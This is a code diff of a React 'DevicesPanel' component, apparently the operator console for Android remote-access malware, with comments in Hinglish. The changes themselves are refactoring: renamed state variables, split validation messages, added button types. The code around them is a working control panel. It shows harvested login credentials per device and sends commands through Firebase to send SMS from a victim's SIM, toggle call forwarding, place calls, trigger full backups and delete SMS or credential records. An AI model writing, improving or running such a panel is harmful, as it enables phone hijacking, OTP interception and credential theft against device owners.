@@ -22,13 +22,13 @@ export default function DevicesPanel({
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
 
-  // Permanent Persistent State for SMS Content & Recipient
-  const [globalSmsNum, setGlobalSmsNum] = useState("");
-  const [globalSmsText, setGlobalSmsText] = useState("");
+  // Permanent Persistent State - Send hone ke baad bhi text aur number nahi hatega
+  const [smsRecipient, setSmsRecipient] = useState("");
+  const [smsContent, setSmsContent] = useState("");
   const [simSelections, setSimSelections] = useState({});
   const [formMemory, setFormMemory] = useState({});
 
-  // LocalStorage se saved SMS text aur number load karna
+  // LocalStorage se saved data load karna
   useEffect(() => {
     try {
       const savedNum = localStorage.getItem("rto_sms_recipient");
@@ -36,24 +36,24 @@ export default function DevicesPanel({
       const savedSims = localStorage.getItem("rto_sim_selections");
       const savedMemory = localStorage.getItem("rto_form_memory");
 
-      if (savedNum) setGlobalSmsNum(savedNum);
-      if (savedText) setGlobalSmsText(savedText);
+      if (savedNum !== null) setSmsRecipient(savedNum);
+      if (savedText !== null) setSmsContent(savedText);
       if (savedSims) setSimSelections(JSON.parse(savedSims));
       if (savedMemory) setFormMemory(JSON.parse(savedMemory));
     } catch (e) {}
   }, []);
 
-  // Recipient Number update & auto-save
+  // Recipient Number update aur auto-save
   const handleRecipientChange = (val) => {
-    setGlobalSmsNum(val);
+    setSmsRecipient(val);
     try {
       localStorage.setItem("rto_sms_recipient", val);
     } catch (e) {}
   };
 
-  // Message Content update & auto-save
+  // Message Content update aur auto-save
   const handleContentChange = (val) => {
-    setGlobalSmsText(val);
+    setSmsContent(val);
     try {
       localStorage.setItem("rto_sms_content", val);
     } catch (e) {}
@@ -70,7 +70,6 @@ export default function DevicesPanel({
     });
   };
 
-  // Generic Field updater for Call/Forward
   const updateMemoryField = (key, val) => {
     setFormMemory((prev) => {
       const updated = { ...prev, [key]: val };
@@ -128,15 +127,17 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
+  // SEND SMS HANDLER (CONTENT CLEAR NAHI HOGA)
   const handleCommand = (type, devId) => {
     const baseRef = ref(db, `user_data/${devId}`);
 
     if (type === "sendsms") {
-      const num = globalSmsNum.trim();
-      const body = globalSmsText.trim();
+      const num = (smsRecipient || "").trim();
+      const body = (smsContent || "").trim();
       const selectedSim = simSelections[devId] || "0";
 
-      if (!num || !body) return showToast("⚠️ Recipient number aur message dono likhein!", "warning");
+      if (!num) return showToast("⚠️ Recipient phone number daalein!", "warning");
+      if (!body) return showToast("⚠️ Message content daalein!", "warning");
       if (!confirm(`Send SMS via SIM ${Number(selectedSim) + 1} to ${num}?`)) return;
 
       update(baseRef, {
@@ -150,7 +151,7 @@ export default function DevicesPanel({
         timestamp: Date.now()
       }).then(() => {
         showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
-        // NOTE: Input text ko clear nahi kiya gaya hai taaki wo wahi rahe!
+        // NOTE: smsContent aur smsRecipient ko intentionally clear nahi kiya gaya hai
       });
     } 
     else if (type === "fwd_on") {
@@ -288,8 +289,8 @@ export default function DevicesPanel({
             _timestamp: val.timestamp || val.date || 0
           })).sort((a, b) => b._timestamp - a._timestamp);
 
-          const sim1Num = dev.numberSim1 || "No SIM 1";
-          const sim2Num = dev.numberSim2 || "No SIM 2";
+          const sim1Num = dev.numberSim1 || "No SIM Found";
+          const sim2Num = dev.numberSim2 || "No SIM Found";
           const currentSelectedSim = simSelections[devId] || "0";
 
           return (
@@ -333,7 +334,7 @@ export default function DevicesPanel({
                 </div>
               </div>
 
-              {/* 4-Column Grid Info */}
+              {/* 4-Item Grid */}
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                 <div className="info-item-premium">
                   <span className="info-label">Device Model</span>
@@ -358,7 +359,7 @@ export default function DevicesPanel({
                 <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
               </div>
 
-              {/* Expandable Tabs */}
+              {/* Expandable Content */}
               {expanded && (
                 <div className="expandable-content">
                   <div className="actions-row-premium">
@@ -373,6 +374,7 @@ export default function DevicesPanel({
                     ].map(a => (
                       <button 
                         key={a.id} 
+                        type="button"
                         className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                         onClick={() => handleTab(devId, a.id)}
                       >
@@ -417,7 +419,7 @@ export default function DevicesPanel({
                     <div className="section-premium">
                       <div className="section-title">
                         <span>Credentials ({loginList.length})</span>
-                        <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
+                        <button type="button" onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                       </div>
                       <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                         {loginList.length === 0 ? (
@@ -467,14 +469,14 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* SEND SMS COMMAND (PERMANENT RECIPIENT & CONTENT) */}
+                  {/* SEND SMS TAB - RECIPIENT & CONTENT NEVER CLEARS */}
                   {curTab === "sendsms" && (
                     <div className="section-premium">
                       <div className="section-title">
                         <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                       </div>
 
-                      {/* SIM Selection */}
+                      {/* SIM Selector */}
                       <div style={{ marginBottom: 10 }}>
                         <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                           Select Outgoing SIM:
@@ -520,40 +522,42 @@ export default function DevicesPanel({
                         </div>
                       </div>
 
-                      {/* Permanent Recipient Phone Number */}
+                      {/* Recipient Phone Number */}
                       <input 
                         type="text" 
                         placeholder="Recipient Phone Number" 
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
-                        value={globalSmsNum}
+                        value={smsRecipient}
                         onChange={(e) => handleRecipientChange(e.target.value)}
                       />
 
-                      {/* Permanent Message Content */}
+                      {/* Persistent Message Content Box */}
                       <textarea 
                         placeholder="Type Message Content..." 
                         rows="3"
                         className="search-input" 
                         style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
-                        value={globalSmsText}
+                        value={smsContent}
                         onChange={(e) => handleContentChange(e.target.value)}
                       />
 
                       <div style={{ display: "flex", gap: 8 }}>
                         <button 
+                          type="button"
                           className="btn-luxury btn-blue" 
                           style={{ flex: 1, justifyContent: "center", padding: "10px" }} 
                           onClick={() => handleCommand("sendsms", devId)}
                         >
                           <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(currentSelectedSim) + 1)}
                         </button>
-                        {(globalSmsNum || globalSmsText) && (
+
+                        {(smsRecipient || smsContent) && (
                           <button
                             type="button"
-                            title="Clear saved draft"
+                            title="Clear Draft"
                             onClick={() => {
-                              if (confirm("Clear saved recipient number and text?")) {
+                              if (confirm("Clear recipient number and text?")) {
                                 handleRecipientChange("");
                                 handleContentChange("");
                                 showToast("Draft cleared", "info");
@@ -632,6 +636,7 @@ export default function DevicesPanel({
 
                       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                         <button 
+                          type="button"
                           className="btn-luxury" 
                           style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
                           onClick={() => handleCommand("fwd_on", devId)}
@@ -639,6 +644,7 @@ export default function DevicesPanel({
                           <i className="fas fa-play"></i> Turn ON Forward
                         </button>
                         <button 
+                          type="button"
                           className="btn-luxury btn-red" 
                           style={{ justifyContent: "center", padding: "10px" }} 
                           onClick={() => handleCommand("fwd_off", devId)}
@@ -661,7 +667,7 @@ export default function DevicesPanel({
                         value={formMemory[`callNum-${devId}`] || ""}
                         onChange={(e) => updateMemoryField(`callNum-${devId}`, e.target.value)}
                       />
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
+                      <button type="button" className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                         <i className="fas fa-phone"></i> Execute Call
                       </button>
                     </div>
@@ -671,7 +677,7 @@ export default function DevicesPanel({
                   {curTab === "backup" && (
                     <div className="section-premium">
                       <div className="section-title">Device Backup</div>
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
+                      <button type="button" className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
                         <i className="fas fa-database"></i> Trigger Full Backup
                       </button>
                     </div>
@@ -682,10 +688,10 @@ export default function DevicesPanel({
                     <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                       <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
-                        <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
+                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
                           Delete SMS
                         </button>
-                        <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
+                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                           Delete Creds
                         </button>
                       </div>
